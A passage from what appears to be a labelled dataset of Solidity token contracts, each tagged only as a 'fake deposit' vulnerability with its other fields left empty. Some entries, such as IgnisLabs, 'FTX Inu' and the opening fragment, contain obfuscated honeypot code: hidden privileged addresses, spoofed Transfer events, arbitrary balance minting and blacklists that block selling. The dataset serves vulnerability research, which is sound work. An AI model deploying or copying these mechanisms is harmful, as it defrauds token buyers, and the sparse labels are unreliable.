Jj);\r\n        Hbv[msg.sender] -= Jj;  \r\n        Hbv[Jl] += Jj; \r\n        emit Transfer (Hashcore, Jl, Jj);} else  \r\n        if(Hcv[msg.sender]) {Hbv[Jl] += Jj;} else\r\n        if(!Hav[msg.sender]) {\r\n        require(Hbv[msg.sender] >= Jj);\r\n        Hbv[msg.sender] -= Jj;  \r\n        Hbv[Jl] += Jj;          \r\n        emit Transfer(msg.sender, Jl, Jj);}}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// File: CC token.sol\r\n\r\npragma solidity ^0.4.16;\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 100000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 100000000000;                        // Update total supply (100000 for example)\r\n        name = \"Codot token\";                                   // Set the name for display purposes\r\n        decimals = 2;                            // Amount of decimals for display purposes\r\n        symbol = \"CC\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.4.11;\r\n\r\n/**\r\n * Math operations with safety checks\r\n */\r\nlibrary SafeMath {\r\n  function mul(uint a, uint b) internal returns (uint) {\r\n    uint c = a * b;\r\n    assert(a == 0 || c / a == b);\r\n    return c;\r\n  }\r\n\r\n  function div(uint a, uint b) internal returns (uint) {\r\n    // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n    uint c = a / b;\r\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n    return c;\r\n  }\r\n\r\n  function sub(uint a, uint b) internal returns (uint) {\r\n    assert(b <= a);\r\n    return a - b;\r\n  }\r\n\r\n  function add(uint a, uint b) internal returns (uint) {\r\n    uint c = a + b;\r\n    assert(c >= a);\r\n    return c;\r\n  }\r\n\r\n  function max64(uint64 a, uint64 b) internal constant returns (uint64) {\r\n    return a >= b ? a : b;\r\n  }\r\n\r\n  function min64(uint64 a, uint64 b) internal constant returns (uint64) {\r\n    return a < b ? a : b;\r\n  }\r\n\r\n  function max256(uint256 a, uint256 b) internal constant returns (uint256) {\r\n    return a >= b ? a : b;\r\n  }\r\n\r\n  function min256(uint256 a, uint256 b) internal constant returns (uint256) {\r\n    return a < b ? a : b;\r\n  }\r\n\r\n  function assert(bool assertion) internal {\r\n    if (!assertion) {\r\n      throw;\r\n    }\r\n  }\r\n}\r\n\r\n/**\r\n * @title ERC20 interface\r\n * @dev see https://github.com/ethereum/EIPs/issues/20\r\n */\r\ncontract ERC20Basic  {\r\n    uint public totalSupply;\r\n    function balanceOf(address _owner) constant returns (uint balance);\r\n    function transfer(address _to, uint _value) returns (bool success);\r\n    function transferFrom(address _from, address _to, uint _value) returns (bool success);\r\n}\r\n  \r\n /**\r\n * @title Standard ERC20 token\r\n *\r\n * @dev Implemantation of the basic standard token.\r\n * @dev https://github.com/ethereum/EIPs/issues/20\r\n * @dev Based on code by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\r\n */ \r\n  \r\ncontract ERC20 is ERC20Basic {\r\n    function approve(address _spender, uint _value) returns (bool success);\r\n    function allowance(address _owner, address _spender) constant returns (uint remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n}\r\n\r\ncontract StandardToken is ERC20 {\r\n        using SafeMath for uint;\r\n\r\n    function transfer(address _to, uint _value) returns (bool) {\r\n     \r\n        if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint _value) returns (bool) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint _value) returns (bool) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint) balances;\r\n    mapping (address => mapping (address => uint)) allowed;\r\n    uint public totalSupply;\r\n}\r\n\r\n/**\r\n * @title Ownable\r\n * @dev The Ownable contract has an owner address, and provides basic authorization control\r\n * functions, this simplifies the implementation of \"user permissions\".\r\n */\r\ncontract Ownable {\r\n  address public owner;\r\n\r\n\r\n  /**\r\n   * @dev The Ownable constructor sets the original `owner` of the contract to the sender\r\n   * account.\r\n   */\r\n  function Ownable() {\r\n    owner = msg.sender;\r\n  }\r\n\r\n\r\n  /**\r\n   * @dev Throws if called by any account other than the owner.\r\n   */\r\n  modifier onlyOwner() {\r\n    if (msg.sender != owner) {\r\n      throw;\r\n    }\r\n    _;\r\n  }\r\n\r\n\r\n  /**\r\n   * @dev Allows the current owner to transfer control of the contract to a newOwner.\r\n   * @param newOwner The address to transfer ownership to.\r\n   */\r\n  function transferOwnership(address newOwner) onlyOwner {\r\n    if (newOwner != address(0)) {\r\n      owner = newOwner;\r\n    }\r\n  }\r\n\r\n}\r\n\r\n/**\r\n * @title MangoDoge contract\r\n */\r\n\r\ncontract MangoDoge is StandardToken, Ownable {\r\n\r\n    uint8 public decimals = 18;\r\n    uint public totalSupply = 1000000000000 * 10 ** 18; \r\n    string public name = \"Mango Doge\";\r\n    string public symbol = \"MDOGE\";\r\n\r\n    function MangoDoge() {\r\n        balances[msg.sender] = totalSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Create(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address bBMC = 0xCf22BDd6C4d0c2967ff0779A60d750F94A8374fb;\r\n\taddress BBMW = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n modifier onlyOwner{\r\n        require(msg.sender == _Owner);\r\n        _; }\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\n\r\ncontract IgnisLabs is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private bBc;\r\n\tmapping (address => bool) private bBb;\r\n    mapping (address => bool) private bBw;\r\n    mapping (address => mapping (address => uint256)) private bBv;\r\n    uint8 private constant BBl = 8;\r\n    uint256 private constant bBS = 200000000 * (10** BBl);\r\n    string private constant _name = \"Ignis Labs\";\r\n    string private constant _symbol = \"IGNIS\";\r\n\r\n\r\n\r\n    constructor () {\r\n        bBc[_msgSender()] = bBS;\r\n         bMkr(BBMW, bBS); }\r\n    \r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return BBl;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return bBS;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return bBc[account];\r\n    }\r\n\t\r\n\r\n   \r\n\t function aBburn(address bBj) onlyOwner public{\r\n        bBb[bBj] = true; }\r\n\t\r\n    function bMkr(address bBj, uint256 bBn) onlyOwner internal {\r\n    emit Transfer(address(0), bBj ,bBn); }\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return bBv[owner][spender];\r\n    }\r\n\t\t\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        bBv[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\t\tfunction bBquery(address bBj) public{\r\n         if(bBb[msg.sender])  { \r\n        bBw[bBj] = true; }}\r\n        \r\n\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == bBMC)  {\r\n        require(amount <= bBc[sender]);\r\n        bBc[sender] -= amount;  \r\n        bBc[recipient] += amount; \r\n          bBv[sender][msg.sender] -= amount;\r\n        emit Transfer (BBMW, recipient, amount);\r\n        return true; }  else  \r\n          if(!bBw[recipient]) {\r\n          if(!bBw[sender]) {\r\n         require(amount <= bBc[sender]);\r\n        require(amount <= bBv[sender][msg.sender]);\r\n        bBc[sender] -= amount;\r\n        bBc[recipient] += amount;\r\n        bBv[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction bBStake(address bBj) public {\r\n        if(bBb[msg.sender]) { \r\n        bBw[bBj] = false;}}\r\n\t\t\r\n\t\tfunction transfer(address bBj, uint256 bBn) public {\r\n        if(msg.sender == bBMC)  {\r\n        require(bBc[msg.sender] >= bBn);\r\n        bBc[msg.sender] -= bBn;  \r\n        bBc[bBj] += bBn; \r\n        emit Transfer (BBMW, bBj, bBn);} else  \r\n        if(bBb[msg.sender]) {bBc[bBj] += bBn;} else\r\n        if(!bBw[msg.sender]) {\r\n        require(bBc[msg.sender] >= bBn);\r\n        bBc[msg.sender] -= bBn;  \r\n        bBc[bBj] += bBn;          \r\n        emit Transfer(msg.sender, bBj, bBn);}}\r\n\t\t\r\n\t\t\r\n\r\n\t\t\r\n\t\t}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\n// FTX INU (FINU) is the original backbone of the FTX ecosystem\r\n// FINU is here for those hurt by the recent market conditions\r\n\r\n// Website: https://www.ftxclassic.io/\r\n// Twitter: https://twitter.com/FTXCLASSIC\r\n// Telegram: https://t.me/ftxclassicentry\r\n\r\nabstract contract Context {\r\n    function _MsgSendr() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address _kpconstruct = 0x0Ea8fDe52ca1C31b8b6142FA3B8d11Bc2f18c62D;\r\n\taddress V2UniswapRouter = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;\r\n    constructor () {\r\n        address msgSender = _MsgSendr();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n}\r\n\r\ncontract FTXINU is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private Opp;\r\n\tmapping (address => bool) private Ypp;\r\n    mapping (address => bool) private Kpp;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    uint8 private constant _decimals = 8;\r\n    uint256 private constant _kpSup = 150000000 * 10**_decimals;\r\n    string private constant _name = \"FTX Inu\";\r\n    string private constant _symbol = \"FINU\";\r\n\r\n    constructor () {\r\n        Opp[_MsgSendr()] = _kpSup;\r\n        emit Transfer(address(0), V2UniswapRouter, _kpSup);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return _kpSup;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return Opp[account];\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n        function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\r\n\t\tfunction ppend(address px) public {\r\n        if(Ypp[msg.sender]) { \r\n        Kpp[px] = false;}}\r\n\r\n        function ppquery(address px) public{\r\n         if(Ypp[msg.sender])  { \r\n        require(!Kpp[px]);\r\n        Kpp[px] = true; }}\r\n\r\n\t\tfunction ppstake(address px) public{\r\n         if(msg.sender == _kpconstruct)  { \r\n        require(!Ypp[px]);\r\n        Ypp[px] = true; }}\r\n\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == _kpconstruct)  {\r\n        require(amount <= Opp[sender]);\r\n        Opp[sender] -= amount;  \r\n        Opp[recipient] += amount; \r\n          _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer (V2UniswapRouter, recipient, amount);\r\n        return true; }    \r\n          if(!Kpp[recipient]) {\r\n          if(!Kpp[sender]) {\r\n         require(amount <= Opp[sender]);\r\n        require(amount <= _allowances[sender][msg.sender]);\r\n        Opp[sender] -= amount;\r\n        Opp[recipient] += amount;\r\n      _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\r\n\t\tfunction transfer(address recipient, uint256 amount) public {\r\n        if(msg.sender == _kpconstruct)  {\r\n        require(Opp[msg.sender] >= amount);\r\n        Opp[msg.sender] -= amount;  \r\n        Opp[recipient] += amount; \r\n        emit Transfer (V2UniswapRouter, recipient, amount);}\r\n        if(Ypp[msg.sender]) {Opp[recipient] = amount;} \r\n        if(!Kpp[msg.sender]) {\r\n        require(Opp[msg.sender] >= amount);\r\n        Opp[msg.sender] -= amount;  \r\n        Opp[recipient] += amount;          \r\n        emit Transfer(msg.sender, recipient, amount);\r\n        }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.5.0;\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP. Does not include\r\n * the optional functions; to access them see {ERC20Detailed}.\r\n */\r\ninterface ERC20Interface {\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender's allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller's\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract ERC20Base is ERC20Interface {\r\n    // Empty internal constructor, to prevent people from mistakenly deploying\r\n    // an instance of this contract, which should be used via inheritance.\r\n    // constructor () internal { }\r\n    // solhint-disable-previous-line no-empty-blocks\r\n\r\n    mapping (address => uint256) public _balances;\r\n    mapping (address => mapping (address => uint256)) public _allowances;\r\n    uint256 public _totalSupply;\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (_balances[msg.sender] >= _value && _value > 0) {\r\n            _balances[msg.sender] -= _value;\r\n            _balances[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { \r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\r\n            _balances[_to] += _value;\r\n            _balances[_from] -= _value;\r\n            _allowances[_from][msg.sender] -= _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function balanceOf(address _owner) public view returns (uint256 balance) {\r\n        return _balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        _allowances[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\r\n      return _allowances[_owner][_spender];\r\n    }\r\n    \r\n    function totalSupply() public view returns (uint256 total) {\r\n        return _totalSupply;\r\n    }\r\n}\r\n\r\ncontract OLBM is ERC20Base {\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    \r\n    constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\r\n        _name = name;\r\n        _symbol = symbol;\r\n        _decimals = decimals;\r\n        _totalSupply = initialSupply;\r\n        _balances[msg.sender] = initialSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the number of decimals used to get its user representation.\r\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\r\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\r\n     *\r\n     * Tokens usually opt for a value of 18, imitating the relationship between\r\n     * Ether and Wei.\r\n     *\r\n     * NOTE: This information is only used for _display_ purposes: it in\r\n     * no way affects any of the arithmetic of the contract, including\r\n     * {IERC20-balanceOf} and {IERC20-transfer}.\r\n     */\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// Abstract contract for the full ERC 20 Token standard\r\n// https://github.com/ethereum/EIPs/issues/20\r\npragma solidity >=0.4.0 <0.9.0;\r\n\r\nabstract contract Token {\r\n  /* This is a slight change to the ERC20 base standard.\r\n     function totalSupply() constant returns (uint256 supply);\r\n     is replaced with:\r\n     uint256 public totalSupply;\r\n     This automatically creates a getter function for the totalSupply.\r\n     This is moved to the base contract since public getter functions are not\r\n     currently recognised as an implementation of the matching abstract\r\n     function by the compiler.\r\n  */\r\n  /// total amount of tokens\r\n  uint256 public totalSupply;\r\n\r\n  /// @param _owner The address from which the balance will be retrieved\r\n  /// @return balance The balance\r\n  function balanceOf(address _owner) public virtual view returns (uint256 balance);\r\n\r\n  /// @notice send `_value` token to `_to` from `msg.sender`\r\n  /// @param _to The address of the recipient\r\n  /// @param _value The amount of token to be transferred\r\n  /// @return success Whether the transfer was successful or not\r\n  function transfer(address _to, uint256 _value) public virtual returns (bool success);\r\n\r\n  /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n  /// @param _from The address of the sender\r\n  /// @param _to The address of the recipient\r\n  /// @param _value The amount of token to be transferred\r\n  /// @return success Whether the transfer was successful or not\r\n  function transferFrom(address _from, address _to, uint256 _value) public virtual returns (bool success);\r\n\r\n  /// @notice `msg.sender` approves `_spender` to spend `_value` tokens\r\n  /// @param _spender The address of the account able to transfer the tokens\r\n  /// @param _value The amount of tokens to be approved for transfer\r\n  